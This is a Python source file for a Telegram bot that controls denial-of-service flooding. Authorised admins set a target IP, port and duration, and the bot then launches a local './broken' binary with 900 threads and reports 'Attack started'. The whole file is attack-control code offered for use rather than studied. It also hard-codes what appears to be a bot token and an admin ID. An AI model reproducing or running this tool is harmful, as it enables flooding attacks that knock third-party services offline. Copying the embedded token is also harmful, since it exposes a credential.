import subprocess
import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# Configuration
BOT_TOKEN = "8016978575:AAGtZq2YIQKIdUuDsx-tb8APm5_SPystyTs"
OWNER_USERNAME = "@GODxAloneBOY"
ADMIN_IDS = ("1662672529",)  # Tuple with admin IDs

flooding_process = None
flooding_command = None
DEFAULT_THREADS = 900

async def set_target(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_command
    user_id = str(update.message.from_user.id)

    # Check if user is authorized
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized. Please contact the owner.")
        return

    if len(context.args) != 3:
        await update.message.reply_text('Example usage: /settarget <IP> <PORT> <DURATION>')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    flooding_command = ['./broken', target_ip, port, duration, str(DEFAULT_THREADS)]
    await update.message.reply_text(f'🔰 Target set successfully!\n\nTarget IP: {target_ip}\nPort: {port}\nDuration: {duration}\n\nTap to start the attack with /start command')

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process, flooding_command
    user_id = str(update.message.from_user.id)

    # Check if user is authorized
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized. Please contact the owner.")
        return

    if flooding_process is not None:
        await update.message.reply_text('🔰 Attack is already running. Use /stop to terminate.')
        return

    if flooding_command is None:
        await update.message.reply_text('❌ No target set. Please set a target using /settarget')
        return

    flooding_process = subprocess.Popen(flooding_command)
    await update.message.reply_text('🔰 Attack started successfully!')

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process
    user_id = str(update.message.from_user.id)

    # Check if user is authorized
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized. Please contact the owner.")
        return

    if flooding_process is None:
        await update.message.reply_text('❌ No attack is running at the moment.')
        return

    flooding_process.terminate()
    flooding_process = None
    await update.message.reply_text('🔰 Attack stopped successfully!')

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("settarget", set_target))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))

    application.run_polling()

if __name__ == '__main__':
    main()
